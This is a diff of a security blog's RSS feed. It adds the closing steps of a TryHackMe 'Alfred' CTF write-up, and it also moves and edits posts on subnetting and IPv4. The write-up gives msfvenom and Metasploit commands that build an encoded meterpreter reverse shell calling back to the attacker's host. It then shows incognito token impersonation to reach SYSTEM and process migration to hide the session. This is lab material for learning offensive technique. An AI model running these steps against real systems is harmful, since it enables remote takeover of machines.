+Therefore I will use &lt;strong&gt;Metasploit Framework&lt;/strong&gt; while it has the incognito module built-in.&lt;/p&gt;
+
+&lt;p&gt;The one I will be exploiting is the &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;.
+Follow these steps to get &lt;a href=&quot;https://superuser.com/questions/471769/what-is-the-nt-authority-system-user&quot;&gt;NT AUTHORITY\SYSTEM&lt;/a&gt; privileges.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Create a meterpreter reverse shell binary.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 &lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;SOME FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ashell.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Upload the executable to the target machine.&lt;/li&gt;
+  &lt;li&gt;Start a reverse tcp listener with metasploit:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
+msf6 use exploit exploit/multi/handler
+msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THM IM&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THE PORT DECLARED FOR EXECUTABLE BEFORE&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+msf6 run&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;After successfully receiving the meterpreter console, load the incognito module.
+&lt;br /&gt;Run:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf6 load incognito&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+Then, list all the available tokens:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;list_tokens &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There will be a delegation token called “BULTIN\Administrators”. We will impersonate that token.
+Delegation and impersonation levels are identical locally.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Run:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;impersonate_token &lt;span class=&quot;s2&quot;&gt;&quot;BUILTIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrators&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If everything were successfully done, &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; should be the output of the &lt;strong&gt;getuid&lt;/strong&gt; command.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Run &lt;strong&gt;ps&lt;/strong&gt; to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;
+By doing that, we have camouflaged our malicious process into a safer looking one.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;To get the root flag, run:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;onfig&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Thanks for reading :)&lt;/p&gt;
 </description>
         <pubDate>Tue, 28 Dec 2021 11:40:00 +0000</pubDate>
         <link>http://localhost:4000/2021/12/28/tryhackme-alfred-ctf-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/2021/12/28/tryhackme-alfred-ctf-writeup/</guid>
         
         <category>TryHackme-Machines</category>
+        
+        <category>ctf</category>
+        
+        <category>pentesting</category>
+        
+        <category>metasploit</category>
+        
+        <category>mindows-privesc</category>
+        
+        <category>windows-tokens</category>
+        
+        <category>bruteforce</category>
+        
+        <category>remote-code-execution</category>
         
         
       </item>
@@ -514,6 +692,8 @@ have fun after that point :))).
         
         <category>windows</category>
         
+        <category>pentesting</category>
+        
         
       </item>
     
@@ -648,7 +828,7 @@ any misconfigurations and privilege escalation possibilities.
 &lt;br /&gt;-&amp;gt; Run &lt;strong&gt;Invoke-AllChecks&lt;/strong&gt;
 &lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
 &lt;br /&gt;&lt;br /&gt;The first result we got is a service called &lt;strong&gt;AdvancedSystemCare9&lt;/strong&gt;, and it has a vulnerability called 
-&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; &lt;a href=&quot;https://krygennn.github.io/posts/unquoted-service-path-vulnerability/&quot;&gt;&lt;strong&gt;-&amp;gt; Read more about it&lt;/strong&gt;&lt;/a&gt;. We will abuse this vulnerability. 
+&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; &lt;a href=&quot;https://www.bbsec.net/2021/12/23/unquoted-service-path-vulnerability/&quot;&gt;&lt;strong&gt;-&amp;gt; Read more about it&lt;/strong&gt;&lt;/a&gt;. We will abuse this vulnerability. 
 &lt;br /&gt;&lt;strong&gt;CanRestart&lt;/strong&gt; field means that the current user, in this case, &lt;strong&gt;bill&lt;/strong&gt;, can manually restart the service even though
 the service itself is being run with &lt;strong&gt;LocalSystem&lt;/strong&gt; service account permissions, which has the top-level privileges.
 &lt;br /&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;LocalSystem Service Account&lt;/strong&gt;&lt;/a&gt;
@@ -821,14 +1001,7 @@ Done ! You will see all bootable system in your grub menu at the next boot.&lt;/
     
       <item>
         <title>IPv4 Protocol</title>
-        <description>&lt;hr /&gt;
-&lt;p&gt;image:
-    src: /assets/img/posts/ipv4-protocol/ip1.jpg
-    alt: SUBNETTING
-    width: 800
-    height: 450
-—&lt;/p&gt;
-&lt;h2 id=&quot;ipv4&quot;&gt;IPv4&lt;/h2&gt;
+        <description>&lt;h2 id=&quot;ipv4&quot;&gt;IPv4&lt;/h2&gt;
 
 &lt;p&gt;IPv4 stands for Internet Protocol version 4. IPs are addresses for users on the internet. Messages and packages delivered via
 IP addresses. IPv4 address spaces consists of four octets. Depending on the class and configuration, some portion of bits in the
@@ -1020,6 +1193,68 @@ this first. If there is no packet loss, you can start to explore other possibili
         <category>network protocols</category>
         
         <category>ip-addresses</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Subnetting</title>
+        <description>&lt;h1 id=&quot;what-is-subnetting-&quot;&gt;WHAT IS SUBNETTING ?&lt;/h1&gt;
+
+&lt;p&gt;As the name suggest, subnetting means dividing a network into sub branches. For example, you have a class with 50 students,
+if you divide them into two groups, you will have two subclasses, 25 students per class. Subetting is just the same however,
+instead of class, this time it is the network which is going to be divided into &lt;strong&gt;smaller chunks&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;why-using-subnetting-&quot;&gt;WHY USING SUBNETTING ?&lt;/h1&gt;
+
+&lt;p&gt;Subnets provide efficiency for networks. Imagine you want to send a message to your dear friend Jack, who lives in the flat
+next to you. Would you deliver the message to some international package delivery service, or to your local post office ?
+If you were to hand out your message to international package delivery service, it would take way too long to deliver it from
+you to your dear friend Jack, due to bigger scale regulations, procedures etc. Probably your message will be carried out to some
+far located central warehouse to wait for dispersion, and the message you want to send to Jack will need to travel hundreds of more miles
+. As you can see it is painful and costly.
+&lt;br /&gt;&lt;br /&gt;
+Just like in the example, when we are talking about network, we are actually sending messages to our friends or someone else. It is 
+much more efficient, time and cost-saving way to communicate without roaming through all the routers in companies’
+network just to reach some node sitting next to us, a co-worker from IT department for example.
+&lt;br /&gt;&lt;br /&gt;
+Instead of having one big network for a company, we can divide the departments into smaller chunks. For instance, one subnet for 
+IT department and one for Human Resources department prevents interference between those two departments. It is not needed
+both for them to see each other’s traffic as they are completely different departments.&lt;/p&gt;
+
+&lt;h2 id=&quot;benefits-of-using-subnets&quot;&gt;Benefits of using subnets&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Network Security and&lt;br /&gt;Management Easiness&lt;/td&gt;
+      &lt;td&gt;Subnetting facilitates network management for network administrators,&lt;br /&gt;thus, more detailed traffic control can be implemented. It also reduces &lt;br /&gt;the risk of spread by quarantining compromised network sections.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Reduces Traffic Congestion&lt;/td&gt;
+      &lt;td&gt;Subnet Mask guarantees that traffic remains within the assigned subnet.&lt;br /&gt;This reduces extensive congestion and diminishes the load on the network.&lt;br /&gt; In subnets, less distance needs to be travelled for any data, less likely to lose &lt;br /&gt;data.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Improve Speed and Performance&lt;/td&gt;
+      &lt;td&gt;After sending a broadcast message, every device on the network will &lt;br /&gt;receive and reply to that message even though the message is not relevant &lt;br /&gt;for most of the machines.By doing that, network capacity and bandwidth &lt;br /&gt;getting drained.However, with subnets only the relevant machines are in&lt;br /&gt; communication.This means performance !&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Before moving any further, I highly recommend you to read &lt;a href=&quot;https://www.bbsec.net/2021/11/18/ipv4-addresses/&quot;&gt;&lt;strong&gt;IPv4 Protocol&lt;/strong&gt;&lt;/a&gt; blogpost first.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+To be continued&lt;/p&gt;
+</description>
+        <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/11/18/subnetting/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/subnetting/</guid>
+        
+        <category>subnetting</category>
+        
+        <category>switch</category>
+        
+        <category>router</category>
         
         
       </item>
@@ -2008,79 +2243,6 @@ As you can see euid (Effective user id) set to 0 which belongs to root.Now you c
         <category>php</category>
         
         <category>shell-injection</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>Subnetting</title>
-        <description>&lt;hr /&gt;
-&lt;p&gt;author: krygennn
-date: 2021-11-18 12:00
-categories: [Blogging, Networking]
-image:
-    src: /assets/img/posts/subnetting/subnetting1.jpg
-    alt: SUBNETTING
-    width: 800
-    height: 450&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;h1 id=&quot;what-is-subnetting-&quot;&gt;WHAT IS SUBNETTING ?&lt;/h1&gt;
-
-&lt;p&gt;As the name suggest, subnetting means dividing a network into sub sub branches. For example, you have a class with 50 students,
-if you divide them into two groups, you will have two subclasses, 25 students per class. Subetting is just the same however,
-instead of class, this time it is the network which is going to be divided into &lt;strong&gt;smaller chunks&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;why-using-subnetting-&quot;&gt;WHY USING SUBNETTING ?&lt;/h1&gt;
-
-&lt;p&gt;Subnets provide efficiency for networks. Imagine you want to send a message to your dear friend Jack, who lives in the flat
-next to you. Would you deliver the message to some international package delivery service, or to your local post office ?
-If you were to hand out your message to international package delivery service, it would take way too long to deliver it from
-you to your dear friend Jack, due to bigger scale regulations, procedures etc. Probably your message will be carried out to some
-far located central warehouse to wait for dispersion, and the message you want to send to Jack will need to travel hundreds of more miles
-. As you can see it is painful and costly.
-&lt;br /&gt;&lt;br /&gt;
-Just like in the example, when we are talking about network, we are actually sending messages to our friends or someone else. It is 
-much more efficient, time and cost-saving way to communicate without roaming through all the routers in companies’
-network just to reach some node sitting next to us, a co-worker from IT department for example.
-&lt;br /&gt;&lt;br /&gt;
-Instead of having one big network for a company, we can divide the departments into smaller chunks. For instance, one subnet for 
-IT department and one for Human Resources department prevents interference between those two departments. It is not needed
-both for them to see each other’s traffic as they are completely different departments.&lt;/p&gt;
-
-&lt;h2 id=&quot;benefits-of-using-subnets&quot;&gt;Benefits of using subnets&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Network Security and&lt;br /&gt;Management Easiness&lt;/td&gt;
-      &lt;td&gt;Subnetting facilitates network management for network administrators,&lt;br /&gt;thus, more detailed traffic control can be implemented. It also reduces &lt;br /&gt;the risk of spread by quarantining compromised network sections.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Reduces Traffic Congestion&lt;/td&gt;
-      &lt;td&gt;Subnet Mask guarantees that traffic remains within the assigned subnet.&lt;br /&gt;This reduces extensive congestion and diminishes the load on the network.&lt;br /&gt; In subnets, less distance needs to be travelled for any data, less likely to lose &lt;br /&gt;data.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;Improve Speed and Performance&lt;/td&gt;
-      &lt;td&gt;After sending a broadcast message, every device on the network will &lt;br /&gt;receive and reply to that message even though the message is not relevant &lt;br /&gt;for most of the machines.By doing that, network capacity and bandwidth &lt;br /&gt;getting drained.However, with subnets only the relevant machines are in&lt;br /&gt; communication.This means performance !&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Before moving any further, I highly recommend you to read &lt;a href=&quot;https://krygennn.github.io/posts/ipv4-addresses&quot;&gt;&lt;strong&gt;IPv4 Protocol&lt;/strong&gt;&lt;/a&gt; blogpost first.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-To be continued&lt;/p&gt;
-</description>
-        <pubDate>Sat, 09 Oct 2021 00:59:00 +0100</pubDate>
-        <link>http://localhost:4000/2021/10/09/subnetting/</link>
-        <guid isPermaLink="true">http://localhost:4000/2021/10/09/subnetting/</guid>
-        
-        <category>subnetting</category>
-        
-        <category>switch</category>
-        
-        <category>router</category>
         
         
       </item>
